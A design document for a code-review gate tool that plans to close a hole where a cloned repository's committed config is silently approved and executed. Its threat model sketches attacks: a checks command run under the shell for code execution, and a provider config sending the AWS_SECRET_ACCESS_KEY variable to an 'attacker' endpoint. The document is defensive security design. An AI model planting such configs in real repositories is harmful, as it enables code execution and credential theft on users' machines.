# Arming & First-Contact Consent — Design (2026-07-17)

Status: DECIDED — consent model **A** (TOFU + worktree inheritance), scope
**S1–S3** this pass; S4–S5 (user-scoped hooks + plugin) deferred until
distribution becomes the active priority. Pending Plan-Gate review (Codex).

## 1. Problem

Reviewgate's arming signal — "does the gate run in this checkout?" — is the mere
presence of hook files that `init` wrote (`.claude/settings.json`,
`.reviewgate/bin/`). Both are **gitignored**. Policy (`reviewgate.config.ts`) is
committed; the mechanism is not. Consequences:

- **Documented fail-open:** linked worktrees and fresh clones have committed
  policy but no hooks → work there is silently un-reviewed
  (`.reviewgate/lore/worktrees-ungated.md`, CLAUDE.md "Worktrees are NOT gated").
- **Blocks user-scoped distribution:** a Claude Code plugin or `~/.claude`
  hooks would fire in *every* repo, and there is no repo-side "is this repo
  armed?" check to make that safe (verified: `gate --hook stop` in a bare
  un-initialised repo runs with defaults and writes `.reviewgate/state.json` +
  `control-plane.json`).
- **S0 (discovered during this investigation): first-contact self-blessing is
  an RCE-class hole *today*, independent of any plugin.** See §3.

## 2. Verified facts (receipts)

| # | Fact | Where |
|---|------|-------|
| F1 | No arming check exists; `loadConfig(null)` returns defaults instead of bailing | `src/config/loader.ts:9` |
| F2 | Default config has **codex `enabled: true`** — a config-less gate run reviews with a real panel | `src/config/defaults.ts:10` |
| F3 | `checks.commands[].run` is executed verbatim via `/bin/sh -c` | `src/core/checks/runner.ts:66` |
| F4 | Provider config accepts `baseUrl` (any URL) and `apiKeyEnv` (any env var name); the ollama/openrouter adapters read `process.env[cfg.apiKeyEnv]` and send it as auth to `baseUrl` | `src/config/define-config.ts` (provider base schema), `src/providers/ollama.ts:96,117` |
| F5 | `resolveControlPlaneConfig`: no LKG + no managed hook (`.reviewgate/bin/gate`) → **`bootstrapControlPlane` self-blesses the present config** (`approvedVia: "init"`). `.reviewgate/bin/` is gitignored, so every fresh clone takes this path | `src/config/control-plane.ts:336-351` |
| F6 | Config *changes* are classified correctly: provider additions and `checks` edits are `approval-required` (TTY `config approve`); the comment names the exact risk | `src/config/control-plane.ts:143-149` |
| F7 | `approveControlPlane` already supports first-contact bootstrap with a typed confirmation phrase (`APPROVE <fp12>`), `approved_via: "human"` | `src/config/control-plane.ts` (approveControlPlane, no-state branch) |
| F8 | Hook invocations carry JSON on stdin (session_id); manual runs don't — hook-vs-manual is detectable but fragile as a trust line | `src/hooks/handlers.ts:371`, `src/cli/commands/gate.ts` |
| F9 | Bench bypasses gate.ts and the control-plane entirely (direct `Orchestrator`); callers of `resolveControlPlaneConfig` are gate.ts, init.ts, tests only | `src/bench/runner.ts` |
| F10 | Global config layer exists: `~/.config/reviewgate/reviewgate.config.ts`, merged defaults ← global ← project | `src/config/global.ts:16-20` |

## 3. Threat model: what a committed config can do

The adversary is **repo content** (a cloned foreign/malicious repo), not the
invoker. A committed `reviewgate.config.ts` that reviewgate executes-as-policy
can:

1. **RCE** — `phases.checks.commands: [{name:"build", run:"<anything>"}]` runs
   under `/bin/sh -c` *before* the panel, on the user's host (F3).
2. **Credential exfiltration** — `providers.ollama.enabled: true, baseUrl:
   "https://attacker/v1", apiKeyEnv: "AWS_SECRET_ACCESS_KEY"` sends the named
   env var as a bearer token to the attacker endpoint (F4).
3. **Quota burn / source disclosure** — enable any provider; diff + file
   context leave the machine.
4. **Agentic blast radius** — gemini/agy and opencode run with
   `--dangerously-skip-permissions`; sandbox `mode:"off"` is the default.

**The S0 chain (exists today, no plugin needed):** clone malicious repo → run
`reviewgate gate --hook stop` manually (docs/bench encourage manual gate runs)
→ F5 self-blesses the committed config as LKG → checks commands execute → RCE.
The F6 approval gate never fires because there is no prior LKG to diff against.
Requires social engineering ("try reviewgate on this repo"), but it is exactly
the class of hole the control-plane exists to close.

Implication for the design: **consent must be an explicit human act per repo,
and it must gate the *first* config, not just changes.** F7 shows the primitive
already exists.

## 4. Design

### Arming rule (the core invariant)

```
armed(checkout) :=
     approved LKG exists for this checkout            (today's init/approve path)
  OR worktree-inherited: linked worktree whose main checkout has an approved
     LKG AND that LKG's effective fingerprint == the fingerprint of the config
     visible in the worktree                          (S3)
  OR global opt-in: user-authored global config sets gateEverywhere: true (S2)
```

- Hook-invoked gate in an **unarmed repo with a project config present** →
  allow-stop with a LOUD one-line notice: "this repo ships a Reviewgate policy;
  run `reviewgate config approve` to arm". **Zero writes** (no state.json, no
  control-plane.json, no .reviewgate/ creation).
- Hook-invoked gate in an unarmed repo **without** any config → silent
  allow-stop, zero writes. (A user-scoped hook must be invisible in random
  repos.)
- Worktree inheritance is sound because the `.git` *file* → common gitdir link
  is local-filesystem proof of same-repo, not spoofable remotely. State stays
  per-worktree; only the *trust decision* is inherited, and only while the
  worktree's config fingerprint equals the approved one (any drift → unarmed +
  loud notice).

### Consent models considered

- **A. TOFU per checkout + worktree inheritance (recommended).** First contact
  requires TTY `reviewgate config approve` (F7 flow, shows policy summary +
  typed fingerprint phrase). Worktrees inherit (S3). One command per clone
  instead of full `init`; `init` remains the rich first-run wizard.
- **B. Global opt-in only.** `gateEverywhere: true` in the user's global
  config arms every repo under the *user's own* policy; project configs stay
  ignored until approved. Safe against config injection, but reviews every
  repo the user touches (quota) and ignores per-repo policy until approve.
  Kept as an *additional* opt-in, not the primary model.
- **C. Status quo + loudness.** Keep init-only arming; unarmed repos with a
  config get the loud notice. Minimal change, closes nothing automatically.

A is the recommendation; B ships as an optional flag inside A's framework; C
is A without S3–S5 (falls out for free).

### Failure-direction asymmetry (deliberate)

- Repo-local managed hooks (today's `gate.sh`): binary missing → **fail
  CLOSED** (unchanged — an initialised repo is armed by definition).
- User-scoped hook shim: binary missing → **allow + loud warning**. Most repos
  it fires in are unarmed; blocking every Stop on every repo because a binary
  is missing would make the plugin uninstallable. Documented trade-off.

## 5. Slices

### S1 — Kill first-contact self-blessing (security fix, standalone)

`resolveControlPlaneConfig`: when no LKG exists and a **custom config source**
is present, never bootstrap silently — throw/return a "bootstrap required"
resolution; gate maps it to the loud unarmed notice (hook path) or an
instructive error (manual path). `init` and `config approve` remain the two
bootstrap doors (both human-typed). Bench unaffected (F9). Tests:
`tests/unit/control-plane.test.ts` first-contact matrix (managed hook × custom
source × invocation kind).

**"Untrusted source" = the PROJECT config only** (`reviewgate.config.ts` IN the
repo). This REVISES the spec's original F-006 stance (block on project OR
global). Rationale, forced by the failing gate tests on a machine that has a
global config: the trust boundary is *who can write the config layer*. The
project layer is what a cloned/foreign repo controls — the S0 vector. The
GLOBAL layer (`~/.config/reviewgate`) is the user's OWN, self-authored policy;
requiring per-repo approval of one's own global policy in every checkout is
friction with no security gain (an attacker does not control it — writing it
means full host compromise). So `inspectConfigSources` gains `hasProjectSource`
(project layer only) and S1 keys off that; a **defaults-only OR global-only**
tree may auto-baseline, only a repo-committed project config gates first
contact. The F-006 folded concern ("global `checks.commands` run without
per-repo consent") is accepted: that is the definition of a *global* policy —
user-authored, applied everywhere by design.

**The approve flow is NOT itself an RCE vector (F-005, verified).** The policy
summary shown before the human types `APPROVE <fp12>` is derived from the
**data-parsed** config, never from evaluating the file as a module.
`importConfigDefault` → `parseConfigSource` → `LiteralParser`
(`src/config/import-config.ts:263-284`) accepts only object/array/string/
number/bool/null literals; any executable expression (`execSync(...)`, an
`import` statement, a call) fails to parse (`import-config.ts:59-62`). So a
malicious `reviewgate.config.ts` cannot run code merely by being *summarised
for approval* — the load-bearing assumption of S1 holds. S1 must reuse this
existing data-parse path for the summary and MUST NOT introduce any
`import()`/`eval` of the config to render it.

**Ordering vs S2/S4 (F-006).** In the S1–S3 scope there are NO user-scoped
hooks (S4 deferred), so the gate only fires where repo-local managed hooks were
installed — i.e. already-armed repos. A *defaults-only* fresh clone therefore
has no hook firing at all; its panel can only run via a **manual** `reviewgate
gate`/`bench` invocation (a conscious act), not silently. The "defaults-only
may auto-baseline" leniency is thus safe within S1–S3. **Hard invariant: S2
(the arming probe that forbids panel execution + writes in unarmed hook
context) MUST land before S4 (user-scoped hooks).** Until S2, "S1 is
independently shippable" means: shippable as the *self-blessing security fix*;
it does not by itself deliver the zero-writes-when-unarmed guarantee, which is
S2's job. This is now stated rather than implied.

**Known defense-in-depth follow-up (TOCTOU, accepted).** The `hasProjectSource`
pre-check and `bootstrapControlPlane`'s internal config read are not one atomic
read: a project config that races in between them would be blessed into the LKG
and only caught by the post-write fingerprint check (which currently returns the
tainted config with an `invalid`-classified pending change). This is NOT
exploitable under the threat model — the S0 case (a config committed at clone
time) is present at the pre-check and throws immediately with no race, and the
window requires an external process writing `reviewgate.config.ts` within a
sub-millisecond gap, i.e. prior code execution on the host (the very capability
the guard assumes absent). The clean fix is read-once: load the snapshot, verify
its source fingerprint against the pre-check, and bless exactly that snapshot
(passing it into `bootstrapControlPlane`). Deferred because it touches the
shared init bootstrap path and the race is not practically reachable.

### S2 — Arming probe in gate entry

Explicit `armed()` check before any state write, panel, checks, or
`.reviewgate/` creation. Implements the arming rule + notice behavior of §4,
including `gateEverywhere` (new global-config-only field, zod-rejected in
project configs). The stop-probe becomes read-only until armed.

### S3 — Worktree trust inheritance

Resolve common gitdir (`git rev-parse --git-common-dir`), read the main
checkout's `control-plane.json` read-only, inherit approval iff fingerprints
match. Doctor: worktree FAIL becomes "armed via main checkout" PASS when
inheritance holds. Closes the worktree blind spot wherever hooks fire there
(user-scoped hooks, or a future per-worktree init).

**Fingerprint = the EFFECTIVE merged config, not the project file (F-007).**
Inheritance compares `effectiveConfigFingerprint(loadEffectiveConfigSnapshot)`
— the fingerprint over defaults ← global ← project (the same value the
control-plane stores as `approved_effective_fingerprint`), NOT a hash of the
committed project file alone. Otherwise a user (or a supply-chain compromise)
editing `~/.config/reviewgate/reviewgate.config.ts` would change the effective
policy — including which `checks.commands` shell out — in every inheriting
worktree without tripping the "drift → unarmed + loud notice" guard. Because
the global layer is per-machine and not committed, the worktree recomputes its
own effective fingerprint from its own layer stack; inheritance holds only when
that equals the main checkout's approved effective fingerprint. A global-config
edit changes both sides identically only if the main checkout is re-approved;
until then the worktree drifts to unarmed — which is the correct fail-safe.

### S4 — `init --user`: user-scoped hooks

Writes Stop/PostToolUse/SessionStart hooks into `~/.claude/settings.json`
calling a small shim (`~/.reviewgate/bin/…`) that: resolves `reviewgate` from
PATH (baked path first), applies the §4 failure asymmetry, and exits 0 fast
when the repo has repo-local managed hooks (dedup: repo-local wins, user-scope
no-ops). Codex host analog deferred (`.codex` user-level hook support TBD).

### S5 — Plugin packaging (distribution of S4)

`.claude-plugin/marketplace.json` + `plugin.json` + `hooks/hooks.json` in the
reviewgate repo → `/plugin marketplace add Codevena/reviewgate`. Plugin hooks =
S4 shim (auto-discovered from the plugin dir). Plus a `commands/` onboarding
command (guided binary install via install.sh + approve flow) and a skill
documenting the decision protocol. The plugin cannot ship the ~40MB binaries;
the shim's missing-binary path (loud allow) covers the not-yet-installed case.

Order: S1 → S2 → S3 (each independently shippable, S1 first and small),
S4 → S5 only when distribution becomes the active priority.

## 6. Explicitly out of scope

- **Lore trust for foreign repos (F-008):** committed `approvals.jsonl` means a
  repo self-approves its canon lore → injected as *trusted* reviewer context
  once the repo is armed. NOTE the sharpened point: config-approval ≠
  lore-approval — arming a repo for its config does not mean the human read its
  lore, yet arming currently unlocks lore injection (elevated-trust prompt
  content from repo bytes). v1 accepts this because arming is still a conscious
  act that a wary user performs only on repos they mean to trust; a per-user
  lore-approval layer decoupled from config-arming is future work. Flagged, not
  solved.
- **Bench / manual paths bypass consent (F-004):** `reviewgate bench` and
  direct `Orchestrator` calls (F9) never pass through `resolveControlPlaneConfig`,
  so S1–S3 do not gate them — a repo that lures a user into `reviewgate bench`
  still ships its diff to external providers with no arming ceremony. S1–S3
  deliberately scope to the *hook* path (the automated surface). Gating the
  manual/bench paths is a separate slice; for now it is a documented,
  human-initiated action, not a silent one.
- Codex-host user-scoped hooks (unknown host support), Windows, and any change
  to per-checkout state layout.
- ECC or any third-party marketplace involvement (rejected earlier — their
  adaptation policy invites re-implementation, not integration).

## 7. Decisions (2026-07-17, Markus)

1. **Consent model: A** — TOFU per checkout + worktree inheritance. First
   contact = TTY `reviewgate config approve` (typed `APPROVE <fp12>` phrase,
   shows policy summary). No silent first-config blessing anywhere.
2. **Scope this pass: S1–S3.** S4 (`init --user`) and S5 (plugin packaging)
   deferred — not built until distribution is the active priority (currently
   behind alpha.12 + deploys). B (`gateEverywhere`) is therefore also deferred:
   it was only ever an *optional* flag inside A's framework, and it belongs to
   the user-scoped-hooks story (S4). S2 ships the arming probe WITHOUT the
   `gateEverywhere` branch for now.

## 8. Consequences of the S1–S3 / model-A decision (implementation notes)

- **S2 arming rule simplifies:** with `gateEverywhere` deferred, `armed()` has
  exactly two true-branches — (a) approved LKG exists for this checkout, or
  (b) worktree-inherited (S3). No global-opt-in branch, no new global-config
  field, no zod addition this pass.
- **S1 is the load-bearing security slice** and ships first, independently. It
  must be correct even if S2/S3 slip.
- **Unarmed-with-config notice (S2)** is the ONLY behavioral change users with
  existing initialised repos will see — and they won't, because an initialised
  repo already has an approved LKG (armed). The notice targets fresh
  clones/worktrees only. Verify no regression on the dogfood repo (this one).
